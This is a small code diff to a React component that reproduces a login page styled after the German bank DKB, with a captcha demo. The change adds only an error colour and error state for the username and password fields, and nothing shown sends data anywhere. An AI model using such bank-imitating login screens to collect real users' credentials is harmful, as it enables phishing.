@@ -17,6 +17,7 @@ const CARD_BORDER = "#CBD9E4";
 const TEXT = "#1A1A1A";
 const TITLE_COLOR = "#373D43";
 const PLACEHOLDER = "#5D7486";
+const ERROR_COLOR = "#D6301A";
 
 const FOOTER_LINKS = [
   { label: "DKB Verwalterplattform", href: "#" },
@@ -37,6 +38,7 @@ const DKB = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
+  const [errors, setErrors] = useState({ username: false, password: false });
   // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
   const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
   const [pendingSubmit, setPendingSubmit] = useState(false);
